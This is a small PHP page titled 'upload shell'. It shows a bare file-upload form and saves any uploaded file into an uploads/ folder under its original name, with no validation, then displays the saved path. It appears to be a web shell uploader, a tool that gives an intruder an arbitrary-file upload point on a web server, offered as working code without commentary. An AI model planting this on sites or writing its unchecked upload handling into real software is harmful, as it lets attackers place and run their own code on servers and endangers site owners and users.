<body style="background-color:black">
<center>
<title>upload shell</title>
<form enctype="multipart/form-data" method="POST" style="color:white">
        <input type="File" name="file">
        <input type="submit" name="Upload" value="upload">
</form>
</center>
<?php

if( isset( $_POST[ 'Upload' ] ) ) { 
    $file_name=$_FILES ['file']['name'];
    $file_type=$_FILES ['file']['type'];
    $file_tem =$_FILES ['file']['tmp_name'];
    $file_save='uploads/'.$file_name;
    move_uploaded_file($file_tem,$file_save);
    echo "<h3 style='color:white'>/uploads/$file_name</h3>";    
    

}
?>
</body>